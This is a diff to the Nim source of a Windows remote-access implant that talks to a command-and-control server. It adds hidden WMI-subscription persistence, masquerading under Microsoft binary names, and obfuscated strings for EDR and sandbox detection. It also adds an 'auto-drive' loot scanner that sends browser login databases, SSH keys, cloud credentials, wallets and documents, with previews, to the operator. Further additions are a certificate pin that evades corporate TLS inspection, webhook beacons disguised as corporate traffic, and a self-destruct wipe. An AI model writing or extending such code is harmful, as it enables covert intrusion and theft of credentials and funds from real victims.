+      obfDec(S_EDR_17), obfDec(S_EDR_18), obfDec(S_EDR_19), obfDec(S_EDR_20),
+      obfDec(S_EDR_21), obfDec(S_EDR_22), obfDec(S_EDR_23)
     ]
     try:
       let (outp, _) = execCmdEx("tasklist /v /fo csv", options = {poStdErrToStdOut})
@@ -976,10 +1144,12 @@ type
   MetaData = object
     regName: string
     taskName: string
+    wmiSubName: string             # WMI permanent event subscription name
     copyPath: string
     installKey: array[32, byte]   # per-install random
     killDate: int64
     sleepMin: int
+    lastContact: int64            # unix timestamp of last successful C2 contact
 
 proc metaXor(data: openArray[byte], key: openArray[byte]): seq[byte] =
   result = newSeq[byte](data.len)
@@ -999,9 +1169,11 @@ proc loadMeta(): MetaData =
     let j = parseJson(cast[string](body))
     if j.hasKey("reg"):   result.regName  = j["reg"].getStr()
     if j.hasKey("task"):  result.taskName = j["task"].getStr()
+    if j.hasKey("wmi"):   result.wmiSubName = j["wmi"].getStr()
     if j.hasKey("copy"):  result.copyPath = j["copy"].getStr()
     if j.hasKey("kill"):  result.killDate = j["kill"].getInt()
     if j.hasKey("sleep"): result.sleepMin = j["sleep"].getInt()
+    if j.hasKey("lc"):    result.lastContact = j["lc"].getInt()
   except: discard
 
 proc saveMeta(meta: MetaData) =
@@ -1009,9 +1181,11 @@ proc saveMeta(meta: MetaData) =
   let body = $ %* {
     "reg":   meta.regName,
     "task":  meta.taskName,
+    "wmi":   meta.wmiSubName,
     "copy":  meta.copyPath,
     "kill":  meta.killDate,
-    "sleep": meta.sleepMin
+    "sleep": meta.sleepMin,
+    "lc":    meta.lastContact
   }
   let bodyBytes = cast[seq[byte]](body)
   let bodyEnc = metaXor(bodyBytes, meta.installKey)
@@ -1023,10 +1197,6 @@ proc saveMeta(meta: MetaData) =
 # ------------------------------------------------------------
 # PERSISTENCE
 # ------------------------------------------------------------
-proc makeRandomRegName(): string =
-  # Random name with no "Win" prefix (less signatured)
-  for _ in 0..<10: result.add(CHARSET[rand(CHARSET.high)])
-
 proc establishPersistence() =
   let exePath = getAppFilename()
   var meta = loadMeta()
@@ -1045,15 +1215,9 @@ proc establishPersistence() =
     # Windows binary names instead. The random subdirectory is
     # APPDATA\\.<random>; legitimate Microsoft binaries sometimes
     # use a leading-dot folder.
-    const LEGIT_NAMES = [
-      "MicrosoftEdgeUpdate.exe",
-      "OneDriveStandaloneUpdater.exe",
-      "WindowsDefenderHealthCheck.exe",
-      "SearchProtocolHost.exe",
-      "SecurityHealthService.exe",
-      "WindowsShellExperience.exe",
-      "CompatTelRunner.exe",
-      "WerFaultSecure.exe",
+    let LEGIT_NAMES = [
+      obfDec(S_LEGIT_1), obfDec(S_LEGIT_2), obfDec(S_LEGIT_3), obfDec(S_LEGIT_4),
+      obfDec(S_LEGIT_5), obfDec(S_LEGIT_6), obfDec(S_LEGIT_7), obfDec(S_LEGIT_8)
     ]
     let baseName = LEGIT_NAMES[rand(LEGIT_NAMES.high)]
     meta.copyPath = appData / "Microsoft" / ("." & randomToken(6)) / baseName
@@ -1081,15 +1245,50 @@ proc establishPersistence() =
 
   # 3. Scheduled task pointing at the copy (uses the SAME copy path, not
   # the original exe — fixes the v1 bug).
-  try:
-    let q = quoteShell(meta.copyPath)
-    discard execCmdEx("schtasks /delete /tn \"" & meta.regName & "\" /f 2>nul",
-                      options = {poStdErrToStdOut})
-    discard execCmdEx("schtasks /create /tn \"" & meta.regName & "\" /tr " & q &
-                      " /sc minute /mo 10 /f /rl LIMITED",
-                      options = {poStdErrToStdOut})
-    meta.taskName = meta.regName
-  except: discard
+  # Skip schtask for engagement+ variants: WMI permanent event
+  # subscription (step 4) is quieter and covers the same trigger.
+  when not (defined(variant_engagement) or defined(variant_aggressive)):
+    try:
+      let q = quoteShell(meta.copyPath)
+      discard execCmdEx("schtasks /delete /tn \"" & meta.regName & "\" /f 2>nul",
+                        options = {poStdErrToStdOut})
+      discard execCmdEx("schtasks /create /tn \"" & meta.regName & "\" /tr " & q &
+                        " /sc minute /mo 10 /f /rl LIMITED",
+                        options = {poStdErrToStdOut})
+      meta.taskName = meta.regName
+    except: discard
+
+  # 4. WMI permanent event subscription (engagement + aggressive only).
+  # Quieter than HKCU Run + schtask — lives in the CIM repository, not
+  # the registry or Task Scheduler. Triggers on user logon and re-runs
+  # the agent copy. The subscription name is randomized and stored in
+  # meta so selfCleanup can tear it down.
+  when defined(variant_engagement) or defined(variant_aggressive):
+    if meta.wmiSubName.len == 0:
+      meta.wmiSubName = randomToken(12)
+    try:
+      # Single PowerShell invocation: creates filter + consumer + binding.
+      # The filter fires on user logon (EventID 4624 — captures both
+      # interactive and RDP). The consumer launches the hidden copy.
+      # -WindowStyle Hidden so no console flashes; -NoProfile for speed.
+      let escPath = meta.copyPath.replace("'", "''")
+      let psCmd = "$f=New-Object Management.ManagementClass 'ROOT\\subscription','__EventFilter',$null;" &
+        "$f.Name='" & meta.wmiSubName & "';" &
+        "$f.QueryLanguage='WQL';" &
+        "$f.Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType=2\";" &
+        "$f|Set-WmiInstance;" &
+        "$c=New-Object Management.ManagementClass 'ROOT\\subscription','CommandLineEventConsumer',$null;" &
+        "$c.Name='" & meta.wmiSubName & "';" &
+        "$c.CommandLineTemplate='" & escPath & "';" &
+        "$c|Set-WmiInstance;" &
+        "$b=New-Object Management.ManagementClass 'ROOT\\subscription','__FilterToConsumerBinding',$null;" &
+        "$b.Filter='__EventFilter.Name=\"" & meta.wmiSubName & "\"';" &
+        "$b.Consumer='CommandLineEventConsumer.Name=\"" & meta.wmiSubName & "\"';" &
+        "$b|Set-WmiInstance"
+      discard execCmdEx("powershell -NoProfile -WindowStyle Hidden -Command \"" & psCmd & "\"",
+                        options = {poStdErrToStdOut, poEvalCommand})
+      meta.taskName = meta.wmiSubName  # alias for the "persist ok" report
+    except: discard
 
   if needSave: saveMeta(meta)
 
@@ -1112,6 +1311,16 @@ proc selfCleanup() =
   if meta.taskName.len > 0:
     discard execCmdEx("schtasks /delete /tn \"" & meta.taskName & "\" /f 2>nul",
                       options = {poStdErrToStdOut})
+  # WMI permanent event subscription (engagement + aggressive)
+  when defined(variant_engagement) or defined(variant_aggressive):
+    if meta.wmiSubName.len > 0:
+      try:
+        let psCleanup = "Get-WmiObject -Namespace ROOT\\subscription -Class __EventFilter | ? { $_.Name -eq '" & meta.wmiSubName & "' } | Remove-WmiObject -Force; " &
+          "Get-WmiObject -Namespace ROOT\\subscription -Class CommandLineEventConsumer | ? { $_.Name -eq '" & meta.wmiSubName & "' } | Remove-WmiObject -Force; " &
+          "Get-WmiObject -Namespace ROOT\\subscription -Class __FilterToConsumerBinding | ? { $_.Filter -like '*" & meta.wmiSubName & "*' } | Remove-WmiObject -Force"
+        discard execCmdEx("powershell -NoProfile -WindowStyle Hidden -Command \"" & psCleanup & "\"",
+                          options = {poStdErrToStdOut, poEvalCommand})
+      except: discard
   # Meta file
   try: removeFile(META_FILE) except: discard
   # Best-effort: delete the copy. Skip if locked (AV scanning).
@@ -1125,13 +1334,6 @@ var
   keylogBuffer = ""
   keyloggerRunning = false
   keylogHook: HHOOK
-
-const VK_LSHIFT = 0xA0
-const VK_RSHIFT = 0xA1
-const VK_LCONTROL = 0xA2
-const VK_RCONTROL = 0xA3
-const VK_LMENU = 0xA4
-const VK_RMENU = 0xA5
 
 proc vkToChar(vk: int32, shifted: bool): string =
   # Simple ASCII map; full keyboard layout is overkill for an implant
@@ -2218,11 +2420,6 @@ proc fileSearch(pattern: string): JsonNode =
 # ------------------------------------------------------------
 # COMMAND HANDLER
 # ------------------------------------------------------------
-type
-  CmdHandler = proc(cmd: JsonNode,
-                    sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
-                   ): Future[void] {.gcsafe, async.}
-
 proc executeShell(command: string): Future[JsonNode] {.async.} =
   # Run synchronously inside the async proc. This blocks the event
   # loop for the duration of the command; heartbeats will be late but
@@ -2275,6 +2472,211 @@ proc uploadFile(localPath: string, remotePath: string,
     await sendToC2(%* {"type": "output", "data": "[+] uploaded " & $data.len & " bytes to " & remotePath})
   except:
     await sendToC2(%* {"type": "output", "data": "[!] upload: " & getCurrentExceptionMsg()})
+
+# ------------------------------------------------------------
+# AUTO-DRIVE: autonomous loot discovery
+# ------------------------------------------------------------
+# When the operator enables auto-drive, the agent walks the box
+# looking for credential-rich / high-value files WITHOUT exfiltrating
+# them. Each finding is streamed back as a JSON "loot" event:
+#   {type: "loot", kind: <category>, path: <abs path>, size: N,
+#    mtime: <unix>, preview: <short string for text>}
+# The dashboard renders a loot panel with one-click "steal" buttons
+# that issue a normal `download <id> <path>` command. This gives the
+# operator a firehose of "what's here" without blindly shipping
+# every byte over the wire.
+when defined(windows):
+  var autoDriveRunning = false
+  # autoDriveSeenFile is read+written from a gcsafe async proc. The
+  # string itself is GC-tracked, so we stash it in a `ref` object on
+  # the heap and access via a gcsafe raw pointer to the slot.
+  var autoDriveSeenSlot: ref string
+  new(autoDriveSeenSlot)
+  autoDriveSeenSlot[] = ""
+
+  proc getSeenFile(): string {.gcsafe.} =
+    {.cast(gcsafe).}:
+      result = autoDriveSeenSlot[]
+
+  proc setSeenFile(s: string) {.gcsafe.} =
+    {.cast(gcsafe).}:
+      autoDriveSeenSlot[] = s
+
+  proc initAutoDrive() {.gcsafe.} =
+    setSeenFile(getEnv("TEMP", expandTilde("~")) / ".svc_audit")
+    let f = getSeenFile()
+    if fileExists(f):
+      try: removeFile(f) except: discard
+    autoDriveRunning = true
+
+  proc autoDriveSeen(): Table[string, bool] {.gcsafe.} =
+    result = initTable[string, bool]()
+    let f = getSeenFile()
+    if f.len > 0 and fileExists(f):
+      try:
+        for line in readFile(f).splitLines():
+          if line.strip.len > 0: result[line] = true
+      except: discard
+
+  proc autoDriveMarkSeen(paths: openArray[string]) {.gcsafe.} =
+    let f = getSeenFile()
+    if f.len == 0: return
+    try:
+      let fh = open(f, fmAppend)
+      defer: fh.close()
+      for p in paths:
+        fh.writeLine(p)
+    except: discard
+
+  proc safeSplitPath(p: string, maxParts: int = 4): string {.gcsafe.} =
+    # For previews of long file paths we keep only the trailing
+    # segments so the dashboard can show something meaningful.
+    let parts = p.split(DirSep)
+    if parts.len <= maxParts: return p
+    return "..." / parts[parts.len - maxParts..<parts.len].join($DirSep)
+
+  proc autoDriveDiscover(
+      sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
+  ): Future[void] {.async, gcsafe.} =
+    # One full pass through the high-value file discovery. This is an
+    # async proc so it can yield between categories and let the
+    # command dispatcher breathe; it doesn't await anything except
+    # sleepAsync for pacing.
+    var seen = autoDriveSeen()
+    var newFound: seq[string] = @[]
+
+    # Helper that registers one loot item.
+    proc emit(kind, path: string, extra: JsonNode = nil) {.async, gcsafe.} =
+      let key = kind & "|" & path
+      if seen.getOrDefault(key, false): return
+      seen[key] = true
+      newFound.add(key)
+      var entry = %* {"type": "loot", "kind": kind, "path": path,
+                       "short": safeSplitPath(path)}
+      if fileExists(path):
+        try:
+          entry["size"] = %(getFileSize(path).int)
+          entry["mtime"] = %(getLastModificationTime(path).toUnix().int)
+        except: discard
+        # short preview for tiny text files (creds, configs)
+        try:
+          if entry["size"].getInt() < 2048:
+            let ext = path.splitFile.ext.toLowerAscii
+            if ext in [".txt", ".conf", ".json", ".xml", ".ini",
+                       ".env", ".yml", ".yaml", ".cfg", ".pem", ".key",
+                       ".crt", ".cer", ".pfx", ".p12"]:
+              entry["preview"] = %readFile(path)
+        except: discard
+      if extra != nil:
+        for k, v in extra.pairs: entry[k] = v
+      await sendToC2(entry)
+      await sleepAsync(50)  # pace: 20 loots/sec max
+
+    # 1) Browser data: Chrome, Edge, Firefox
+    let localApp = getEnv(obfDec(S_LOCALAPPDATA), expandTilde("~"))
+    for (sub, brand) in [
+      ("Google\\Chrome\\User Data", "chrome"),
+      ("Microsoft\\Edge\\User Data", "edge"),
+      ("Mozilla\\Firefox\\Profiles", "firefox")]:
+      let base = localApp / sub
+      if dirExists(base):
+        # Chrome/Edge: Default + Profile N
+        if brand != "firefox":
+          for prof in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
+            let pdir = base / prof
+            if dirExists(pdir):
+              for db in ["Login Data", "Cookies", "Web Data", "History", "Bookmarks"]:
+                let f = pdir / db
+                if fileExists(f): await emit("browser", f, %* {"browser": brand, "profile": prof, "label": brand & "/" & prof & "/" & db})
+              let ls = base / prof / "Local State"
+              if fileExists(ls): await emit("browser", ls, %* {"browser": brand, "label": brand & "/" & prof & "/Local State (encrypted key)"})
+        else:
+          for d in walkDirs(base / "*"):
+            if dirExists(d):
+              for db in ["logins.json", "cookies.sqlite", "key4.db", "cert9.db", "places.sqlite", "formhistory.sqlite"]:
+                let f = d / db
+                if fileExists(f): await emit("browser", f, %* {"browser": "firefox", "label": "firefox/" & db})
+
+    # 2) SSH keys
+    let sshDir = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_SSH_DIR)
+    if dirExists(sshDir):
+      for f in walkFiles(sshDir / "*"):
+        let n = f.extractFilename
+        if n.startsWith(obfDec(S_ID_RSA)) or n == obfDec(S_KH) or
+           n == "config" or n.endsWith(".pub"):
+          await emit("ssh", f, %* {"label": "ssh/" & n})
+
+    # 3) Cloud tokens
+    let uprof = getEnv(obfDec(S_USERPROFILE), expandTilde("~"))
+    let cloudEntries = [
+      (uprof / obfDec(S_AWS) / obfDec(S_AWS_CREDS), "AWS credentials", "cloud"),
+      (uprof / obfDec(S_AWS) / "config", "AWS config", "cloud"),
+      (uprof / obfDec(S_GCONFIG) / obfDec(S_GCLOUD) / "credentials", "GCP credentials", "cloud"),
+      (uprof / obfDec(S_AZ), "Azure CLI token cache", "cloud"),
+      (uprof / obfDec(S_GIT), "Git credentials", "cloud"),
+      (uprof / obfDec(S_KUBE) / "config", "kubeconfig (cluster creds)", "cloud")
+    ]
+    for (p, lbl, k) in cloudEntries:
+      if fileExists(p): await emit(k, p, %* {"label": lbl})
+
+    # 4) Wallet data
+    let eth = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_ETHEREUM)
+    if dirExists(eth):
+      for d in [eth / obfDec(S_ETH_KEYSTORE), eth / "keystore"]:
+        if dirExists(d):
+          for f in walkFiles(d / "*"):
+            await emit("wallet", f, %* {"label": "eth keystore"})
+    let btc = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_BITCOIN) / "wallet.dat"
+    if fileExists(btc): await emit("wallet", btc, %* {"label": "BTC wallet.dat"})
+
+    # 5) Recent files (jump list .lnk — fingerprint of activity)
+    let recentDir = getEnv(obfDec(S_APPDATA), expandTilde("~")) /
+                    "Microsoft\\Windows\\Recent"
+    if dirExists(recentDir):
+      for f in walkFiles(recentDir / "*.lnk"):
+        let n = f.extractFilename
+        await emit("recent", f, %* {"label": "recent: " & n})
+
+    # 6) Documents scan (small enough to exfil plaintext files like
+    # *.pdf, *.docx, *.xlsx, *.txt, *.csv under a tight size cap)
+    let docsRoot = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / "Documents"
+    if dirExists(docsRoot):
+      try:
+        for f in walkFiles(docsRoot / "*"):
+          let ext = f.splitFile.ext.toLowerAscii
+          if ext in [".pdf", ".docx", ".xlsx", ".txt", ".csv",
+                     ".pptx", ".odt", ".ods", ".doc", ".xls",
+                     ".key", ".pem", ".env", ".yml"]:
+            try:
+              let sz = getFileSize(f).int
+              if sz > 0 and sz < 10 * 1024 * 1024:  # skip > 10 MB
+                await emit("doc", f, %* {"label": "doc/" & f.extractFilename})
+            except: discard
+      except: discard
+
+    # 7) Persist our seen list so the next pass skips these
+    if newFound.len > 0:
+      autoDriveMarkSeen(newFound)
+
+    await sendToC2(%* {"type": "output",
+      "data": "[*] auto-drive scan complete — " & $newFound.len &
+              " new finds (pass summary)"})
+
+  proc autoDriveLoop(
+      sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
+  ) {.async, gcsafe.} =
+    # Runs repeatedly while autoDriveRunning is true. Each pass
+    # scans the high-value paths; new loot events stream out.
+    while autoDriveRunning:
+      try:
+        await autoDriveDiscover(sendToC2)
+      except:
+        await sendToC2(%* {"type": "output",
+          "data": "[!] auto-drive: " & getCurrentExceptionMsg()})
+      # Pause between passes. 60s feels alive without thrashing.
+      for _ in 0..<600:
+        if not autoDriveRunning: return
+        await sleepAsync(100)
 
 # Dedup state: last seen command_id
 var lastCmdId: int64 = -1
@@ -2611,6 +3013,41 @@ proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
         "data": "[" & BuildPrefix & "] tg: " & (if ok: "ok" else: "fail")})
     else:
       await sendToC2(%* {"type": "output", "data": "[!] tg: telegram not configured"})
+  of "hook":
+    # args = freeform text — push a notification to the configured
+    # Discord/Slack webhook. Blends with corp HTTPS traffic.
+    if webhookEnabled():
+      let ok = webhookSend("[" & BuildPrefix & "] " & cmdArgs)
+      await sendToC2(%* {"type": "output",
+        "data": "[" & BuildPrefix & "] hook: " & (if ok: "ok" else: "fail")})
+    else:
+      await sendToC2(%* {"type": "output", "data": "[!] hook: webhook not configured"})
+  of "autodrive":
+    # args = "start" or "stop". When started, the agent scans the
+    # host for high-value files (browser creds, SSH keys, cloud
+    # tokens, wallet data, recent files, docs) and streams each
+    # discovery as a `loot` event. The dashboard renders them in
+    # a loot panel with one-click steal buttons. Idle when no
+    # new items are found; passes re-run every 60s.
+    when defined(windows):
+      if cmdArgs == "start":
+        if autoDriveRunning:
+          await sendToC2(%* {"type": "output", "data": "[!] auto-drive already running"})
+          return
+        initAutoDrive()
+        asyncCheck autoDriveLoop(sendToC2)
+        await sendToC2(%* {"type": "output",
+          "data": "[" & BuildPrefix & "] auto-drive started — scanning browser/ssh/cloud/wallet/docs/recent"})
+      elif cmdArgs == "stop":
+        if not autoDriveRunning:
+          await sendToC2(%* {"type": "output", "data": "[!] auto-drive not running"})
+          return
+        autoDriveRunning = false
+        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] auto-drive stopped"})
+      else:
+        await sendToC2(%* {"type": "output", "data": "[!] usage: autodrive start|stop"})
+    else:
+      await sendToC2(%* {"type": "output", "data": "[!] autodrive: not supported on this OS"})
   of "ping": discard
   else:
     await sendToC2(%* {"type": "output", "data": "[!] unknown: " & cmdName})
@@ -2622,10 +3059,123 @@ proc computeDelay(attempt: int): float =
   let base = min(RECONNECT_BASE_DELAY * pow(2.0, attempt.float), RECONNECT_MAX_DELAY)
   max(1.0, base + base * RECONNECT_JITTER * (rand(1.0) * 2 - 1))
 
+# ------------------------------------------------------------
+# TLS-pinned WebSocket connect
+# ------------------------------------------------------------
+# When PINNED_CERT_PEM is non-empty at compile time, the agent pins the
+# WSS trust anchor to ONLY that PEM certificate. The OS trust store is
+# NOT consulted, so a corporate TLS-inspection proxy presenting its own
+# cert is rejected at the TLS handshake (the only alternative the proxy
+# has is to drop the connection outright, which is fine — agent retries
+# failover URLs). Empty PINNED_CERT_PEM = legacy behavior (use
+# newWebSocket which delegates to Nim's httpclient + system trust store).
+when defined(windows):
+  var pinnedCertPath: string = ""
+
+  proc ensurePinnedCertFile(): string =
+    # Write the baked-in PEM cert to a temp file so the SSL context can
+    # load it via caFile=, return the path. Cached after first call.
+    if pinnedCertPath.len > 0:
+      # may have been removed by AV or operator cleanup; re-check
+      if fileExists(pinnedCertPath): return pinnedCertPath
+    if PINNED_CERT_PEM.len == 0: return ""
+    let tmpDir = getEnv("TEMP", expandTilde("~"))
+    let path = tmpDir / ("svc-cache-" & $getCurrentProcessId() & ".pem")
+    try:
+      let f = open(path, fmWrite)
+      defer: f.close()
+      f.write(PINNED_CERT_PEM)
+      pinnedCertPath = path
+      return path
+    except:
+      return ""
+
+  proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
+    # Parse the URL ourselves so we own the TLS layer.
+    let uri = parseUri(url)
+    let isWss = uri.scheme.toLowerAscii() == "wss"
+    if not isWss or PINNED_CERT_PEM.len == 0:
+      # No pinning needed -> fall back to the ws library's path.
+      return await newWebSocket(url)
+
+    # Resolve port (default 443 for wss, overridable via URI).
+    let port = if uri.port.len > 0: Port(parseInt(uri.port)) else: Port(443)
+    let host = if uri.hostname.len > 0: uri.hostname else: "127.0.0.1"
+
+    # Open a raw TCP socket and connect.
+    let sock = newAsyncSocket()
+    await sock.connect(host, port)
+
+    # Build the pinned SSL context. caFile = ONLY the pinned cert
+    # (no system store appending, which is the whole point of pinning).
+    let certPath = ensurePinnedCertFile()
+    if certPath.len == 0:
+      sock.close()
+      raise newException(IOError, "pin: cert write failed")
+    let ctx = newContext(verifyMode = CVerifyPeer, caFile = certPath)
+    if ctx == nil:
+      sock.close()
+      raise newException(IOError, "pin: SSL context create failed")
+    # Wrap + perform handshake as a client. SNI is sent so the server
+    # can still serve the right vhost (though we only accept the one
+    # pinned cert chain regardless).
+    wrapConnectedSocket(ctx, sock, handshakeAsClient, host)
+
+    # Send the WebSocket upgrade request manually (the ws library's
+    # path goes through newAsyncHttpClient which uses its own SSL setup;
+    # here we control the socket ourselves).
+    var secStr = newString(16)
+    for i in 0 ..< secStr.len: secStr[i] = char rand(255)
+    let secKey = base64.encode(secStr)
+    let pathPart = if uri.path.len > 0: uri.path else: "/"
+    let req =
+      "GET " & pathPart & " HTTP/1.1\r\n" &
+      "Host: " & host & (if uri.port.len > 0: ":" & uri.port else: "") & "\r\n" &
+      "Upgrade: websocket\r\n" &
+      "Connection: Upgrade\r\n" &
+      "Sec-WebSocket-Version: 13\r\n" &
+      "Sec-WebSocket-Key: " & secKey & "\r\n\r\n"
+    await sock.send(req)
+
+    # Read the HTTP response (until \r\n\r\n).
+    var headers = ""
+    while not (contains(headers, "\r\n\r\n")):
+      let chunk = await sock.recv(1)
+      if chunk.len == 0:
+        sock.close()
+        raise newException(IOError, "pin: upgrade response EOF")
+      headers.add(chunk)
+      if headers.len > 8192:
+        sock.close()
+        raise newException(IOError, "pin: upgrade response too large")
+
+    let statusLine = headers.split("\r\n", 1)[0]
+    if "101" notin statusLine:
+      sock.close()
+      raise newException(IOError, "pin: upgrade failed: " & statusLine)
+    let upgrade = headers.toLowerAscii()
+    if "upgrade: websocket" notin upgrade:
+      sock.close()
+      raise newException(IOError, "pin: not a WebSocket upgrade")
+
+    # Hand the wrapped socket off to the ws library's WebSocket object
+    # so the rest of the agent code (ws.send / ws.recvFrame / etc.) is
+    # unchanged. masked=true matches what ws.newWebSocket sets.
+    var ws: WebSocket
+    ws = WebSocket()
+    ws.masked = true
+    ws.tcpSocket = sock
+    ws.readyState = Open
+    return ws
+else:
+  # Non-windows build: no pinning, fall back to ws.newWebSocket.
+  proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
+    return await newWebSocket(url)
+
 proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.} =
   var ws: WebSocket = nil
   try:
-    ws = await newWebSocket(url)
+    ws = await connectPinnedWebSocket(url)
   except:
     return
 
@@ -2638,7 +3188,7 @@ proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.}
     n
   let anB64 = base64.encode(ourNonce)
   # Server checks: HMAC over the payload string + expects an "an" field for the nonce
-  let hmacHex = hmacHex(AGENT_SECRET, payload)
+  let hmacHex = hmacHex(agentSecret(), payload)
   let regFrame = $ %* {"p": payload, "h": hmacHex, "an": anB64}
 
   try:
@@ -2678,13 +3228,22 @@ proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.}
   # Derive session key. Both sides must use the same canonical order:
   # HMAC(secret, server_nonce || agent_nonce). The server does this with
   # (sn, ourAgentNonce); the agent does it with (sn, ourAgentNonce) too.
-  sc.key = deriveSessionKey(AGENT_SECRET, sn, ourNonce)
+  sc.key = deriveSessionKey(agentSecret(), sn, ourNonce)
 
   echo "[" & BuildPrefix & "] registered as ", sc.agentId
+  # Update last-contact timestamp on successful C2 registration.
+  # This is the dead-man's switch heartbeat — if the agent goes
+  # DEAD_MAN_SECS without getting this far, it self-destructs.
+  meta.lastContact = getTime().toUnix
+  try: saveMeta(meta[]) except: discard
   if telegramEnabled():
     let h = getHostname()
     let u = getEnv("USERNAME", "?")
     discard telegramSend("[X7K agent] " & sc.agentId & " " & h & "/" & u)
+  if webhookEnabled():
+    let h = getHostname()
+    let u = getEnv("USERNAME", "?")
+    discard webhookSend("[" & BuildPrefix & "] agent " & sc.agentId & " " & h & "/" & u)
 
   # Persistence: only on first connect (META_FILE is the gate)
   # and only if the operator has explicitly enabled it. The flag
@@ -2718,7 +3277,6 @@ proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.}
   # is via encryptFrame/decryptFrame.
   var sendLock = false
   var closed = false
-  var processedCmds: seq[int64] = @[]
   proc sendToC2(msg: JsonNode) {.async, gcsafe.} =
     if closed or sendLock: return
     sendLock = true
@@ -2796,8 +3354,6 @@ when defined(windows):
   const
     # ProcessDebugPort (informational, often 0 for non-debugged)
     PROCESS_DEBUG_PORT = 0x07
-    # SystemKernelDebuggerInformation
-    SYSTEM_KERNEL_DEBUGGER_INFORMATION = 0x23
 
   proc isDebuggerPresent(): bool =
     # 1. Win32 IsDebuggerPresent (fast, exposed by kernel32)
@@ -2814,8 +3370,8 @@ when defined(windows):
     # dynamically so we don't need a static ntdll import (which
     # an analyst can hook).
     try:
-      var ntdll = "ntdll.dll"
-      var procName = "NtQueryInformationProcess"
+      var ntdll = obfDec(S_NTDLL)
+      var procName = obfDec(S_NTQIP)
       let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
       if hMod == 0: return false
       let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
@@ -2840,8 +3396,8 @@ when defined(windows):
     # avoid a static ntdll import that an analyst can hook.
     try:
       type NtCTType = proc(): pointer {.stdcall.}
-      var ntdll = "ntdll.dll"
-      var procName = "NtCurrentTeb"
+      var ntdll = obfDec(S_NTDLL)
+      var procName = obfDec(S_NTCTEB)
       let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
       if hMod == 0: return false
       let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
@@ -2867,18 +3423,9 @@ when defined(windows):
     # positives on legit corporate targets.
     var hits = 0
     let paths = [
-      "C:\\windows\\system32\\drivers\\vboxguest.sys",
-      "C:\\windows\\system32\\drivers\\vmhgfs.sys",
-      "C:\\windows\\system32\\drivers\\vm3dmp.sys",
-      "C:\\windows\\system32\\drivers\\vmmouse.sys",
-      "C:\\windows\\system32\\drivers\\vmusbmouse.sys",
-      "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
-      "C:\\windows\\system32\\drivers\\vmci.sys",
-      "C:\\windows\\system32\\drivers\\vmhgfs.sys",
-      "C:\\windows\\system32\\drivers\\vboxsf.sys",
-      "C:\\windows\\system32\\drivers\\sandboxie.sys",
-      "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
-      "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe",
+      obfDec(S_BOX_1), obfDec(S_BOX_2), obfDec(S_BOX_3), obfDec(S_BOX_4),
+      obfDec(S_BOX_5), obfDec(S_BOX_6), obfDec(S_BOX_7), obfDec(S_BOX_8),
+      obfDec(S_BOX_9), obfDec(S_BOX_10), obfDec(S_BOX_11)
     ]
     for p in paths:
       if fileExists(p): inc hits
@@ -2912,14 +3459,6 @@ when defined(windows):
     if checkTimingAnomaly(): return true
     return false
 
-  proc secureZero(secret: var openArray[byte]) =
-    # RtlSecureZeroMemory — guaranteed not to be optimized away by
-    # the C compiler, unlike a plain `zeroMem` which gets elided
-    # if the buffer is no longer used.
-    if secret.len == 0: return
-    let p = cast[LPVOID](unsafeAddr secret[0])
-    RtlSecureZeroMemory(p, secret.len.DWORD)
-
   proc panicWipe() =
     # Operator-triggered self-destruct. Wipes all keys, persistence,
     # staged files, and exits. Called when the operator sends
@@ -2941,10 +3480,10 @@ when defined(windows):
       try: removeFile(META_FILE) except: discard
     # Remove staged exfil data
     try:
-      removeDir(getEnv("TEMP", "") / "svc")
+      removeDir(getEnv("TEMP", "") / obfDec(S_SVC_DIR))
     except: discard
     # Remove our own log
-    try: removeFile(AGENT_LOG) except: discard
+    try: removeFile(getAgentLogPath()) except: discard
     agentLog("panic: full wipe complete, exiting")
     quit(0)
 # /when defined(windows)
@@ -2955,6 +3494,7 @@ when not defined(windows):
   proc panicWipe() = discard
 
 proc agentLoop() {.async.} =
+  initLock(agentSecretLock)
   randomize()
   when defined(windows):
     # NOTE: AMSI bypass + ETW suppression are NOT applied at startup.
@@ -2987,6 +3527,17 @@ proc agentLoop() {.async.} =
     selfCleanup()
     return
 
+  # Dead-man's switch: if the agent hasn't contacted the C2 in
+  # DEAD_MAN_SECS, shred self + persistence and exit. Prevents the
+  # agent from lingering after the op ends (C2 seized, operator
+  # lost access). Only fires if lastContact was ever set (non-zero).
+  when defined(windows):
+    if DEAD_MAN_SECS > 0 and meta.lastContact > 0:
+      let elapsed = getTime().toUnix - meta.lastContact
+      if elapsed >= DEAD_MAN_SECS:
+        agentLog("dead-man trigger, self-destructing")
+        panicWipe()  # shred + cleanup + quit
+
   # If Telegram is configured, send a "I'm alive" notification with
   # the current host + user so the operator has it on their phone
   # even before the WSS channel is up.
@@ -2995,6 +3546,15 @@ proc agentLoop() {.async.} =
       let host = getHostname()
       let user = getEnv("USERNAME", "?")
       discard telegramSend("[X7K boot] " & host & " / " & user)
+    # Webhook beacon: same boot notification, blends with corp traffic.
+    if webhookEnabled():
+      let host = getHostname()
+      let user = getEnv("USERNAME", "?")
+      discard webhookSend("[" & BuildPrefix & " boot] " & host & " / " & user)
+
